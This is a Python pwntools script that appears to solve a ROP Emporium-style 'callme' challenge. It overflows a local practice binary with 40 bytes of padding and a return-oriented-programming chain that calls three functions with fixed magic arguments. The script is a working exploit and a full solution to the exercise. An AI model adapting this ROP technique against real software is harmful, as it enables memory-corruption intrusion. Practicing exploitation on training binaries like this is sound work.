#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
exe = './callme'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

#callme_one   = p64(0x40092d)
#callme_two   = p64(0x400919)
#callme_three = p64(0x400905)


callme_one   = p64(0x0000000000400720)
callme_two   = p64(0x0000000000400740)
callme_three = p64(0x00000000004006f0)

beef = p64(0xdeadbeefdeadbeef)
food = p64(0xd00df00dd00df00d)
cafe = p64(0xcafebabecafebabe)

ret = p64(0x00000000004006be)
args = beef + cafe + food

gadget = p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret;


payload = b'A'*40 + gadget + args + ret + callme_one + gadget + args + callme_two + gadget + args + callme_three


io.sendline(payload)

io.interactive()

